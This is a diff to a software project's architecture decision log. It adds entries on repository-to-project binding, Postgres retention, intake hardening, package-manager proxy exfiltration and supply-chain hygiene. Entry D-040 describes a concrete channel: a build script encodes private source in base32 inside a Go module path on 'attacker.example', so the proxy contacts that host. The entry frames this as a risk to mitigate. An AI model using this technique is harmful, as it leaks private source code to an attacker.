@@ -42,6 +42,13 @@ This file exists for traceability. It records every architectural decision for r
 | D-034 | Every stage ships mock backends and a local Postgres | Accepted | Arik | 2026-10-25 |
 | D-035 | scan-controller core: leader lock, claim loop, DT read path, outbox relay | Proposed | Architecture team | 2026-10-25 |
 | D-036 | Fetch and scan Jobs: launch, watch, failure mapping, GitHub App tokens | Proposed | Architecture team | 2026-10-25 |
+| D-037 | A scan's repository must match its DT project before write-back | Accepted | Delegated by Arik | 2026-10-25 |
+| D-038 | Postgres retention: reachability-api drops whole monthly partitions | Accepted | Delegated by Arik | 2026-10-25 |
+| D-039 | Intake hardening: OIDC audience, request size limit, REQUEST_MISMATCH warning | Accepted | Delegated by Arik | 2026-10-25 |
+| D-040 | Exfiltration through package-manager proxies: mitigate and accept the rest | Accepted | Delegated by Arik | 2026-10-25 |
+| D-041 | Review follow-ups: supply-chain hygiene, local stack, declined items | Accepted | Delegated by Arik | 2026-10-25 |
+
+D-037 to D-041 close the post-merge review of PRs #1 and #2. Arik asked the reviewer to "solve all how you see fit, explain yourself in the decision files", so they are recorded as Accepted under that delegation; any of them can be superseded the usual way.
 
 Arik reviewed the Proposed decisions on 2026-10-25. He accepted D-006, D-013, D-014, D-015, D-020, D-028 and D-030, accepted D-008 after discussion, and replaced D-021 with D-032 and D-029 with D-031.
 
@@ -535,6 +542,93 @@ Arik reviewed the Proposed decisions on 2026-10-25. He accepted D-006, D-013, D-
   - Negative: PUBLISHING is a dead end until the outputs PR. A disrupted scan restarts from FETCHING, so the clone runs again.
 - Source: architecture team, implementation of PR "fetch and scan Jobs".
 
+### D-037 A scan's repository must match its DT project before write-back
+- Status: Accepted / Decided by: delegated by Arik ("solve all how you see fit"), 2026-10-25 / Date: 2026-10-25
+- Context: A request names a repository and a DT project separately, and nothing checked that they belong together. Any `scan-submitter`, or anything that can write to `requests.v1` (which carries no identity, 5.4a j), could pair repository A with project B. With VEX or ANALYSIS write-back, B's real vulnerabilities would be written back as `NOT_AFFECTED / CODE_NOT_REACHABLE` because A's code does not call them. A copy-paste mistake in a pipeline does the same with no attacker.
+- Decision:
+  - A DT project names its repositories in either of two ways, both read from the lookup response the controller already fetches (no extra DT call): a `vcs` external reference (which SBOM tools such as cyclonedx-maven fill from the SCM metadata), or a tag `reach-repo=<host>/<org>/<repo>`. URLs are reduced to lower-case `<host>/<org>/<repo>`; `scm:git:`, `git+`, scp-like `git@host:org/repo`, `.git` and sub-paths are accepted.
+  - In FETCHING, right after the uuid check, the controller compares the scan's repository with the project's:
+    - BOUND (the project names it): the scan proceeds unchanged.
+    - MISMATCH (the project names only other repositories): the scan fails with the new permanent code `DT_REPO_MISMATCH`, in every mode except OFF. A project that says it is built from somewhere else is never scanned against this code.
+    - UNBOUND (the project names none): depends on `reach.dt.repo-binding`.
+  - `reach.dt.repo-binding` (scan-controller): `WRITEBACK` (default) scans an unbound project but lowers VEX or ANALYSIS write-back to COMMENT and adds a `WRITE_BACK_NARROWED` warning to the scan; `REQUIRED` fails an unbound project with the new permanent code `DT_REPO_UNBOUND`; `OFF` skips the check (for migrations only).
+  - COMMENT stays allowed for unbound projects: it adds a note but changes no analysis state, so a wrong pairing is visible to the project's owners without suppressing anything.
+- Alternatives considered:
+  - A `repo_binding` table edited through an admin API: rejected for now. It duplicates what DT already holds, needs its own access control and drifts from DT. DT project owners are the right people to state the binding.
+  - A DT project property: rejected because properties are not in the lookup response, so it costs an extra call per scan, and tags are easier to set in the DT UI and API.
+  - REQUIRED as the default: rejected, because most existing projects carry no binding yet and every scan of them would fail. WRITEBACK keeps reachability results flowing while closing the suppression path; operators can switch to REQUIRED once projects are tagged.
+- Consequences:
+  - Positive: no scan can write NOT_AFFECTED into a project that has not named the repository. A mismatch fails fast, before any GitHub or S3 work.
+  - Negative: project owners must add a `vcs` reference or a tag before VEX or ANALYSIS write-back takes effect. That DT 5's lookup response includes `externalReferences` and `tags` is UNVERIFIED (it holds for DT 4.x); if it does not, the controller needs one extra project read per scan.
+- Source: post-merge review of PR #1, implemented in the review-fixes PR.
+
+### D-038 Postgres retention: reachability-api drops whole monthly partitions
+- Status: Accepted / Decided by: delegated by Arik ("solve all how you see fit"), 2026-10-25 / Date: 2026-10-25
+- Context: D-025 sets 90-day Postgres retention by dropping partitions, and section 6.1 says `request_key` is pruned with them, but no component owned the job. Partitions were being created (D-033) and never removed.
+- Decision:
+  - A SQL function `scan.apply_retention(keep interval)` (changeset 005) does the work, as `scan.ensure_monthly_partitions` does for creation. It deletes `scan_queue` and `request_key` rows whose scan is older than `now() - keep`, then drops each monthly partition of `call_path` (once it exists), `finding` and `scan`, in that order, whose upper bound is at or before the cutoff. A partition is dropped only when its whole month is past the cutoff, so nothing younger than the retention period is lost; rows can live up to one month longer than `keep`.
+  - It takes a transaction-level advisory lock, so several replicas can call it at once, and it rejects a `keep` below one day, so a mistyped setting cannot wipe the tables.
+  - reachability-api runs it in its schema housekeeping on `reach.retention.cron` (default `0 45 3 * * ?`) with `reach.retention.postgres` (default P90D), next to partition creation.
+- Alternatives considered:
+  - pg_partman: rejected for the same reason as in D-033; one more extension to run on a managed Postgres for a few lines of SQL.
+  - Running it in scan-controller: rejected, because the API already owns the schema and partition creation, and the controller only validates the schema.
+  - Row-level `DELETE ... WHERE created_at < cutoff`: rejected; it bloats the tables and is what partitioning is for.
+- Consequences:
+  - Positive: Postgres size is bounded, and a deleted scan never leaves an idempotency key or queue row pointing at it.
+  - Negative: a `metadata.uid` older than the retention period can be reused and starts a new scan. That is acceptable: emitters retry within minutes, not months.
+- Source: post-merge review of PR #1, implemented in the review-fixes PR.
+
+### D-039 Intake hardening: OIDC audience, request size limit, REQUEST_MISMATCH warning
+- Status: Accepted / Decided by: delegated by Arik ("solve all how you see fit"), 2026-10-25 / Date: 2026-10-25
+- Context: The post-merge review of PR #2 found that production accepted tokens minted for any client of the IdP, that REST bodies were limited only by the 10 MiB Quarkus default, and that a reused `metadata.uid` with different content silently returned the old scan.
+- Decision:
+  - Audience: `quarkus.oidc.token.audience` defaults to `${REACH_OIDC_AUDIENCE:reachability-api}` in every profile, and a production start (launch mode NORMAL, OIDC tenant enabled) fails when it is empty. The issuer is checked through the provider's discovery document as before; deployments that pin a key instead of using discovery must set `quarkus.oidc.token.issuer`. The integration guide now says which claim carries roles for client-credentials tokens.
+  - Size: `reach.intake.max-request-bytes` (default 262144, 256 KiB) applies to both intakes before parsing. REST answers 413 `PAYLOAD_TOO_LARGE` as problem+json; Kafka sends the record to the DLQ with `reach-error-code: PAYLOAD_TOO_LARGE`. `quarkus.http.limits.max-body-size=1M` is the transport cap above it (Quarkus answers 413 with no problem body there). A valid request is a few KB, so the limit is generous.
+  - REQUEST_MISMATCH: on a duplicate `metadata.uid`, the API compares the stored `unmapped.reachability` object with the new one. If they differ, the response (REST) carries a `REQUEST_MISMATCH` warning saying the new content was ignored. The warning is returned only, not stored, so the original scan's record is unchanged. On Kafka the duplicate is still accepted silently, as there is no response; the metric counts it as a duplicate.
+- Alternatives considered:
+  - Rejecting a mismatched duplicate with 409: rejected, because 5.4a b promises that a resubmission returns 202, and emitters retrying after a timeout must not break.
+  - Comparing a hash column: rejected for now; it needs a migration and a backfill, and comparing the stored jsonb on the (rare) duplicate path is cheap.
+  - A 64 KiB limit: rejected as too tight for long label sets and future fields.
+- Consequences:
+  - Positive: tokens for other services are rejected, oversize bodies never reach the JSON Schema validator, and emitter bugs that reuse uids become visible.
+  - Negative: deployments must make their IdP put `reachability-api` (or `REACH_OIDC_AUDIENCE`) in `aud`. The wrong-audience case is not covered by an automated test yet, because the tests disable the OIDC tenant; the local profile (`token.sh`) exercises it by hand.
+- Source: post-merge review of PRs #1 and #2, implemented in the review-fixes PR.
+
+### D-040 Exfiltration through package-manager proxies: mitigate and accept the rest
+- Status: Accepted / Decided by: delegated by Arik ("solve all how you see fit"), 2026-10-25 / Date: 2026-10-25
+- Context: The scan Job runs untrusted build code that can reach Artifactory and S3 only (D-008, D-009). Artifactory remotes fetch whatever names the client asks for, so "only Artifactory" is not a closed channel. For example, a build script can request the Go module `attacker.example/x/@v/<base32 of source>.info`; a Go remote that resolves VCS paths, or proxy.golang.org behind it, then contacts `attacker.example`. Package names sent to npm or PyPI upstreams leak data the same way at lower bandwidth. The private source of the scanned repository is exactly what an attacker would want.
+- Decision:
+  - Record the risk as R16 and treat it as accepted residual risk after the mitigations below, rather than claiming the scan namespace has no egress.
+  - Mitigations (operations-guide "Artifactory for the scan namespace"): the scan Job's Artifactory token can read only a dedicated virtual repository per ecosystem; those remotes point only at curated upstreams (Maven Central, the npm and PyPI registries, proxy.golang.org) and never at arbitrary VCS hosts; the Go remote resolves only through proxy.golang.org with "VCS" fetching disabled, and `GOPRIVATE`-style internal modules come from a local repository; Artifactory Curation or a block list where licensed; Artifactory request logs are shipped to the SIEM with alerts on 404 bursts and module paths outside known hosts from the scan token.
+  - What stays: the public upstreams themselves still see the names requested, and a patient attacker can encode data in many small requests. This is accepted, because the alternative (no dependency resolution in the scan Job) would make reachability analysis impossible for most ecosystems.
+- Alternatives considered:
+  - Pre-resolving dependencies in the trusted fetch Job: rejected; it runs build tooling against the untrusted repository, which D-008 exists to avoid.
+  - An offline mirror with no remote repositories: rejected for day 1 as too costly to curate; worth revisiting for high-sensitivity orgs.
+- Consequences:
+  - Positive: the trust statement in architecture section 2 is now accurate, and operators know what to configure in Artifactory.
+  - Negative: the controls live in Artifactory, outside this repository, so they rely on the operations checklist.
+- Source: post-merge review of PR #1.
+
+### D-041 Review follow-ups: supply-chain hygiene, local stack, declined items
+- Status: Accepted / Decided by: delegated by Arik ("solve all how you see fit"), 2026-10-25 / Date: 2026-10-25
+- Context: The post-merge reviews of PRs #1 and #2 left several low findings. This entry records what was done and why the rest was declined.
+- Decision:
+  - Done:
+    - CI actions are pinned to commit SHAs with the version in a comment. `.github/dependabot.yml` proposes weekly updates for GitHub Actions, Maven (Quarkus grouped, so LTS patches arrive together) and the source-fetch base image.
+    - The local stack publishes every port on 127.0.0.1 only, because it uses fixed credentials and plaintext Kafka.
+    - Stale lines in architecture.md: the "rotation job" for the DT key (section 11, R6) is replaced by manual rotation in Vault (D-032); the dangling "see the report list" now says the summary check is an assumption until the outputs PR implements it; `request_key` pruning names D-038.
+    - The in-flight duplicate rule in section 10 ("waits for the running scan") has no mechanism yet; it is open question E-18 for the dedupe PR.
+  - Declined, with reasons:
+    - `findById` scans every partition when looking up a scan by id: kept. The id is the primary lookup for clients, the partitions are few (about four months kept under D-038 plus three created ahead), and each probe is a primary-key index lookup. Encoding the month in the id would change the public contract.
+    - `Sql.translate` and `StoreUnavailableException` exist in both services: kept for now. The two copies already differ (the API also classifies commit-time failures, D-033), and `common` depends only on Jackson today; revisit when a third service needs them.
+    - `Problem.TYPE_BASE` (`https://reach.example.internal/problems/`) stays a constant. 5.4a a already says `type` URIs are stable identifiers and clients branch on `code`; making it configurable would let two deployments emit different types for the same error.
+    - The GitHub App token minted when `reach.job.enabled=false`: kept, so the local stack exercises the token path end to end against the mock GitHub.
+- Alternatives considered: none beyond the items above.
+- Consequences:
+  - Positive: action and dependency updates are visible PRs instead of silent tag moves.
+  - Negative: Dependabot PRs add review load; the Quarkus group keeps it to one PR a week for the platform.
+- Source: post-merge reviews of PRs #1 and #2.
+
 ## Superseded / changed decisions
 
 Earlier draft positions that changed during the 2026-10-25 conversation:
@@ -552,7 +646,7 @@ Earlier draft positions that changed during the 2026-10-25 conversation:
 
 ## How to add a decision
 
-- The log is append-only. Use the next free ID (D-037, D-038, ...).
+- The log is append-only. Use the next free ID (D-042, D-043, ...).
 - Never edit the Decision text of an Accepted decision. Supersede it with a new ID, and mark the old one "Superseded by D-0NN".
 - Proposed decisions may be edited until Arik reviews them. On review, set Status to Accepted and Decided by to Arik.
 - Add the new ID to the index and, if it replaces an earlier position, to the Superseded table.
